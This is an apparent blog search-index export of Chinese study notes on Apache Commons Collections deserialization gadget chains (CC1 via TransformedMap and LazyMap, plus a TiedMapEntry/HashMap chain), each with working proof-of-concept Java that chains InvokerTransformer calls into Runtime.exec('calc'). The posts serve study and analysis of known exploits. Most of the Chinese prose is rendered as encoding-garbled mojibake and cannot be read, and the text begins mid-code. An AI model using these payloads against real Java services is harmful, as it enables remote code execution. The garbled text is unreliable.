keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map lazyMap<span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å…ˆæ”¾è¿›å»ä¸€ä¸ªè§¦å‘ä¸äº†çš„,é¿å…åºåˆ—åŒ–çš„æ—¶å€™è§¦å‘</span>        TiedMapEntry tiedMapEntry<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashmap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">claz</span><span class="token operator">=</span>TiedMapEntry<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field tiedMap<span class="token operator">=</span>claz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"map"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tiedMap<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tiedMap<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span>lazyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// å°†factoryé‡æ–°èµ‹å€¼ä¸ºlazyMapä»è€Œè§¦å‘factory.transform</span>        Class <span class="token class-name">clazz</span><span class="token operator">=</span>LazyMap<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field factory<span class="token operator">=</span>clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"factory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factory<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factory<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>hashmap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰“é€š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220824202059912.png" alt="image-20220824202059912"></p><h5 id="é“¾å­"><a href="#é“¾å­" class="headerlink" title="é“¾å­"></a>é“¾å­</h5><p>ç”±äºæ¯”è¾ƒç®€å•ï¼Œå°±ä¸è°ƒè¯•äº†ã€‚</p><pre class="line-numbers language-java"><code class="language-java">HashMap#readobjectHashMap#hashTiedMapEntry#getValueLazyMap#getChainedTransformer#transformInvokerTransformer#transform<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h5><ol><li><a href="https://space.bilibili.com/2142877265?spm_id_from=333.337.0.0">https://space.bilibili.com/2142877265?spm_id_from=333.337.0.0</a> ç™½æ—¥æ¢¦ç»„é•¿</li></ol>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gadget </tag>
            
            <tag> Javaå®‰å…¨ </tag>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC1_LazyMapåˆ†æ</title>
      <link href="/2021/12/11/cc1-lazymap/"/>
      <url>/2021/12/11/cc1-lazymap/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ä¸Šå›è®²åˆ°CC1ä¸­çš„TransformedMap#checksetValueè°ƒç”¨ChainedTransformer#transformè¿™æ¡é“¾å­ï¼Œè¿™å›å­¦ä¹ LazyMap#getè¿™æ¡è·¯ã€‚CC6ä¹Ÿç”¨åˆ°äº†LazyMapè¿™æ¡è·¯ï¼Œå› æ­¤è¿™æ¡é“¾å­éœ€è¦ç»†å“ã€‚</p></blockquote><h5 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h5><p>ä»transformè¯´èµ·ï¼Œä¸Šå›CC1è®²è§£åˆ°äº†é€šè¿‡ChainedTransformeré“¾å¼è°ƒç”¨ä»è€Œå®ç°RCEï¼Œæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯æ‰¾è°è°ƒç”¨ChainedTransformer#transformï¼Œå¦‚æœç±»çš„å®ä¾‹ä¸€èˆ¬éƒ½å¯ä»¥é€šè¿‡æ„é€ æ–¹æ³•åˆå§‹åŒ–ï¼Œå› æ­¤æˆ‘ä»¬æ‰¾è°è°ƒç”¨äº†transformå°±å¯ä»¥äº†ã€‚</p><p>Find Usagesï¼Œå‘ç°LazyMap#getæ–¹æ³•è°ƒç”¨äº†transformï¼Œå¦‚æœmapä¸­ä¸åŒ…å«è¿™ä¸ªkeyï¼Œåˆ™è°ƒç”¨ï¼›è‹¥åŒ…å«ï¼Œåˆ™return map.get(key)ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823132756796.png" alt="image-20220823132756796" style="zoom: 67%;" /><p>ä¸TransformedMapç›¸åŒï¼ŒLazyMapä¹Ÿæ˜¯é€šè¿‡decorateæ–¹æ³•å®ä¾‹åŒ–è‡ªèº«ï¼Œfactoryæˆ‘ä»¬ä¼ chainedTransformerå°±å¯ä»¥äº†ï¼Œè‡³äºmapæˆ‘ä»¬å…ˆä¼ ä¸€ä¸ªç©ºçš„ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823132938918.png" alt="image-20220823132938918" style="zoom:67%;" /><p>å‰é¢ä¸å˜ï¼Œåˆ†æåˆ°è¿™ä¸€æ­¥çš„expä¸ºï¼š</p><pre class="line-numbers language-java"><code class="language-java">        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map lazyMap<span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//å®ä¾‹åŒ–LazyMap</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥æ‰¾è°è°ƒç”¨äº†LazyMap#get,æˆ‘ä»¬å¯ä»¥çœ‹åˆ°AnnotationInvocationHandler#invokeè°ƒç”¨äº†getï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠmemberValuesèµ‹å€¼lazyMapå³å¯ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823135153801.png" alt="image-20220823135153801" style="zoom: 67%;" /><p>InvocationHandleræ¥å£æ˜¯proxyä»£ç†å®ä¾‹çš„è°ƒç”¨å¤„ç†ç¨‹åºå®ç°çš„ä¸€ä¸ªæ¥å£ï¼ŒAnnotationInvocationHandlerç»§æ‰¿è‡ªInvocationHandlerã€‚ç®€è€Œè¨€ä¹‹æˆ‘ä»¬éœ€è¦é€šè¿‡Proxyä»£ç†AnnotationInvocationHandlerçš„ä¸€ä¸ªå®ä¾‹ï¼Œåªè¦è¿™ä¸ªä»£ç†è°ƒç”¨äº†ä»»æ„ä¸€ä¸ªæ–¹æ³•ï¼Œé‚£ä¹ˆå°±ä¼šè§¦å‘AnnotationInvocationHandler#invokeï¼Œæ˜¾ç„¶ï¼Œè¿™ä¸ªè¢«ä»£ç†çš„å®ä¾‹çš„membervalueè¦èµ‹å€¼lazyMapã€‚</p><p>ä¸ºæ­¤ï¼Œæˆ‘ä»¬é¦–å…ˆè¦å®ä¾‹åŒ–ä¸€ä¸ªè¢«ä»£ç†çš„annotationInvocationHandlerï¼Œæ¥ç€è¦å®ä¾‹åŒ–ä¸€ä¸ªannotationInvocationHandlerç”¨æ¥æŠŠè¿™ä¸ªä»£ç†å¯¹è±¡ä¼ è¿›å»ã€‚</p><p>é“¾å­ï¼š</p><pre class="line-numbers language-java"><code class="language-java">AnnotationInvocationHandler#readobject<span class="token function">Proxy</span><span class="token punctuation">(</span>AnnotationInvocationHandler<span class="token punctuation">)</span><span class="token punctuation">.</span>xxxAnnotationInvocationHandler#invokeLazyMap#getChainedTransformer#transformInvokerTransformer#transform<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h5><p>ç›´æ¥æ–­åˆ°AnnotationInvocationHandler#invokeæ–¹æ³•ä¸­çš„æ‰§è¡Œgetå¤„ï¼Œ</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823141057434.png" alt="image-20220823141057434"  /><p>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹å½“å‰çš„å‡ ä¸ªé‡è¦å˜é‡ã€‚memberValuesæ­£æ˜¯expç¬¬ä¸€æ¬¡å®ä¾‹åŒ–ä¼ å…¥çš„LazyMapï¼Œvar2æ˜¯è§¦å‘invokeçš„æ–¹æ³•åç§°ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823141307332.png" alt="image-20220823141307332"></p><p>å›çœ‹AnnotationInvocationHandler#readObjectï¼Œè¿™é‡Œç¡®å®è°ƒç”¨äº†entrySet()æ–¹æ³•ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823141449245.png" alt="image-20220823141449245"></p><p>è·Ÿè¿›getæ–¹æ³•ï¼Œè¿™é‡Œä¼ æ¥çš„keyå°±æ˜¯æ–¹æ³•åentrySetï¼Œæ˜¾ç„¶è¿™ä¸ªç©ºmapä¸å­˜åœ¨è¿™ä¸ªkeyï¼Œå› æ­¤æ‰§è¡Œtransformã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823141657649.png" alt="image-20220823141657649"></p><p>æ¥ç€å°±èµ°åˆ°äº†ChainedTransformer#transformé“¾å¼è°ƒç”¨InvokerTransformerä»è€ŒRCEã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823141853772.png" alt="image-20220823141853772"></p><p>RCEã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823142035973.png" alt="image-20220823142035973"></p><h5 id="éšè—å¼‚å¸¸æ—¥å¿—çš„æ€è€ƒ"><a href="#éšè—å¼‚å¸¸æ—¥å¿—çš„æ€è€ƒ" class="headerlink" title="éšè—å¼‚å¸¸æ—¥å¿—çš„æ€è€ƒ"></a>éšè—å¼‚å¸¸æ—¥å¿—çš„æ€è€ƒ</h5><blockquote><p>ä¸ªäººæ€è€ƒï¼Œæœ€åä¹Ÿæ²¡åˆ†æå‡ºä¸ºå•¥ã€‚</p></blockquote><p>ç»†å¿ƒçš„å°ä¼™ä¼´å„¿ä¼šçœ‹åˆ°expé‡Œçš„Transformeræ•°ç»„æœ€åå¤šå¤„è¦ç»™new ConstantTransformer(1),è¿™æ˜¯å¹²å•¥ç”¨çš„ï¼Ÿ</p><p>å…ˆä¸Šç»“è®ºï¼š</p><p><strong>å¦‚æœä¸åŠ è¿™ä¸€å¥ï¼Œåˆ™æŠ¥é”™ï¼š</strong></p><p><strong>Exception in thread â€œmainâ€ java.lang.ClassCastException: java.lang.ProcessImpl cannot be cast to java.util.Set</strong></p><p><strong>å¦‚æœåŠ ä¸Šï¼Œåˆ™æŠ¥é”™ï¼š</strong></p><p>**Exception in thread â€œmainâ€ java.lang.ClassCastException: java.lang.Integer cannot be cast to java.util.Set **</p><p>ProcessImplæ˜¯ProcessæŠ½è±¡ç±»çš„å®ç°ç±»ï¼Œè¿ç»´äººå‘˜ä¸€çœ‹ï¼Œè¿™å—ååºåˆ—åŒ–å±…ç„¶ä¼šå‡ºç°Processè¿™ä¸ªè¿›ç¨‹ç±»ï¼Œè‚¯å®šä¼šæ’æŸ¥ã€‚</p><p>å¯ä»¥çœ‹åˆ°é“¾å¼è°ƒç”¨æ‰§è¡Œå®Œcalcå¼¹å‡ºè®¡ç®—å™¨ï¼Œæ­¤æ—¶objectä¸ºProcessImplã€‚è¿™æ˜¯å› ä¸ºgetRuntime.exec()å®é™…ä¸Šå°±æ˜¯è°ƒç”¨ProcessBuilder.start()ï¼Œè€ŒprocessImplæ˜¯è¢«ProcessBuilder.start()è¿™ä¸ªæ–¹æ³•è¿›è¡Œåˆ›å»ºçš„ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823142210674.png" alt="image-20220823142210674"></p><p>è€Œæ˜¾ç„¶ä»–è¿˜è¦æ¥ç€è§¦å‘ConstantTransformer(ï¼‰ï¼Œä»è€Œè¿”å›1ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823142559561.png" alt="image-20220823142559561"></p><p>LazyMap#getè¿”å›1ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823142644704.png" alt="image-20220823142644704" style="zoom: 80%;" /><p>è°ƒè¯•çš„è¿‡ç¨‹ä¸­å‘ç°â€œObject var6 &#x3D; this.memberValues.get(var4);â€getæ–¹æ³•è¿”å›çš„var6å±…ç„¶æ˜¯-1ï¼Œç™¾æ€ä¸å¾—å…¶è§£ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823143749904.png" alt="image-20220823143749904" style="zoom: 80%;" /><p>è€Œè°ƒåˆ°è¿™é‡Œï¼Œå†å¾€ä¸‹åˆ†æå°±ç›´æ¥è·³åˆ°è¿™é‡Œï¼ŒæŠ¥é”™ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823144630811.png" alt="image-20220823144630811"></p><p>å¾€ä¸‹åˆ†æåˆ°äº†ObjectStreamClass#invokeReadObjectï¼Œå¯ä»¥çœ‹åˆ°åŠ¨æ€ä»£ç†è°ƒç”¨invokeæ˜¯é€šè¿‡ObjectStreamClassæ¥è°ƒç”¨çš„ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823145822137.png" alt="image-20220823145822137"></p><p>å°±æ˜¯åœ¨è¿™ä¸ªæ–¹æ³•æŠ›å‡ºäº†å¼‚å¸¸ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823150146149.png" alt="image-20220823150146149"></p><p>è‡³äºä»–ä¸ºå•¥ä¼šæŠ¥è¿™ä¸ªï¼Œæˆ‘æ€€ç–‘æ˜¯è¯¥invokeæ–¹æ³•ç”±entrySet()è§¦å‘æ‰€ä»¥ä¼šæŠ¥è¿™ä¸ªé”™è¯¯ï¼Ÿ</p><h5 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h5><ol><li><a href="https://space.bilibili.com/2142877265?spm_id_from=333.337.0.0">https://space.bilibili.com/2142877265?spm_id_from=333.337.0.0</a> ç™½æ—¥æ¢¦ç»„é•¿</li></ol>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gadget </tag>
            
            <tag> Javaå®‰å…¨ </tag>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC1åˆ©ç”¨é“¾åˆ†æ</title>
      <link href="/2021/12/05/cc1-li-yong-lian-fen-xi/"/>
      <url>/2021/12/05/cc1-li-yong-lian-fen-xi/</url>
      
        <content type="html"><![CDATA[<h5 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h5><p>CC1å¾ˆé‡è¦ï¼Œéœ€è¦å»æ·±æŒ–ã€‚</p><h5 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h5><p>æ¼æ´ç‚¹åœ¨äºInvokerTransformerç±»çš„transformæ–¹æ³•ã€‚å¯ä»¥è°ƒç”¨è¯¥å‡½æ•°ï¼Œä»¥åå°„çš„å½¢å¼è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œé€ æˆRCEã€‚å…¶ä¸­inputæ˜¯ä¼ è¿›æ¥çš„objectã€‚</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> Object <span class="token function">transform</span><span class="token punctuation">(</span>Object input<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>input <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Class <span class="token class-name">cls</span> <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Method method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>iMethodName<span class="token punctuation">,</span> iParamTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> iArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//...ç•¥</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è€ŒiMethodName, iParamTypes, iArgsè¿™ä¸‰ä¸ªå‚æ•°æ˜¯åœ¨æ„é€ æ–¹æ³•ä¸­è¢«èµ‹å€¼ã€‚</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token function">InvokerTransformer</span><span class="token punctuation">(</span>String methodName<span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iMethodName <span class="token operator">=</span> methodName<span class="token punctuation">;</span>        iParamTypes <span class="token operator">=</span> paramTypes<span class="token punctuation">;</span>        iArgs <span class="token operator">=</span> args<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°è¯¥æ„é€ å‡½æ•°æ˜¯å¯ä»¥å®ä¾‹åŒ–çš„ï¼Œè€Œtransformä¹Ÿæ˜¯publicå¯ä»¥è¢«å¯¹è±¡è°ƒç”¨ã€‚æˆ‘ä»¬é€šè¿‡InvokerTransformerå¼¹è®¡ç®—å™¨ã€‚</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        Runtime r<span class="token operator">=</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Runtimeä¸æ˜¯å¯åºåˆ—åŒ–ç±»ï¼Œå› æ­¤åç»­éœ€è¦é€šè¿‡åå°„è°ƒç”¨ã€‚</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è€Œæ¥ä¸‹æ¥æˆ‘ä»¬è¦æ‰¾å“ªä¸ªæ–¹æ³•è°ƒç”¨äº†InvokerTransformer#transformï¼Œé€šè¿‡IDEAçš„Find usageså¯ä»¥æ‰¾åˆ°21å¤„è°ƒç”¨ï¼Œæ¥ä¸‹æ¥çœ‹transformedMap#checksetValueï¼Œprotectedç±»å‹ã€‚</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">protected</span> Object <span class="token function">checkSetValue</span><span class="token punctuation">(</span>Object value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> valueTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è€ŒvalueTransformeræ˜¯åœ¨æ„é€ æ–¹æ³•ä¸­èµ‹å€¼ã€‚å¯ä»¥çœ‹åˆ°æ„é€ æ–¹æ³•ä¹Ÿæ˜¯protectedç±»å‹ï¼Œå› æ­¤è¿˜è¦é€šè¿‡ç±»ä¸­æ–¹æ³•è°ƒç”¨ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token function">TransformedMap</span><span class="token punctuation">(</span>Map map<span class="token punctuation">,</span> Transformer keyTransformer<span class="token punctuation">,</span> Transformer valueTransformer<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">super</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>keyTransformer <span class="token operator">=</span> keyTransformer<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>valueTransformer <span class="token operator">=</span> valueTransformer<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾ˆå®¹æ˜“å‘ç°InvokerTransformer#decorateè¿›è¡Œäº†å®ä¾‹åŒ–ï¼Œå¹¶ä¸”æ˜¯public staticç±»å‹ã€‚ä¸ºäº†è°ƒç”¨InvokerTransformer#transformï¼Œ<strong>è¦ä»¤valueTransformer&#x3D;new InvokerTransformer()</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> Map <span class="token function">decorate</span><span class="token punctuation">(</span>Map map<span class="token punctuation">,</span> Transformer keyTransformer<span class="token punctuation">,</span> Transformer valueTransformer<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> keyTransformer<span class="token punctuation">,</span> valueTransformer<span class="token 